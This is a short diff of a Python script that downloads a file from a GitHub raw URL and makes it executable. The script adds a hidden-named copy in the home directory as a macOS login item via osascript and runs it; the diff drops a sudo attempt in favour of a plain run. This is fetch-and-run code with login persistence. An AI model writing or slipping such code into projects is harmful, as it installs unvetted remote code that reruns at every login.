@@ -13,7 +13,4 @@ open(localfile, 'wb').write(get("https://raw.githubusercontent.com/mrdog233o5/Re
 system(f"osascript -e 'tell application \"System Events\" to make login item at end with properties {{path:\"{expanduser('~')}/.{filename}\", hidden:false}}' > /dev/null")
 system(f"chmod 555 {localfile}")
 
-try:
-    subproc([f"sudo localfile"])
-except:
-    subproc([localfile])
+subproc([localfile])
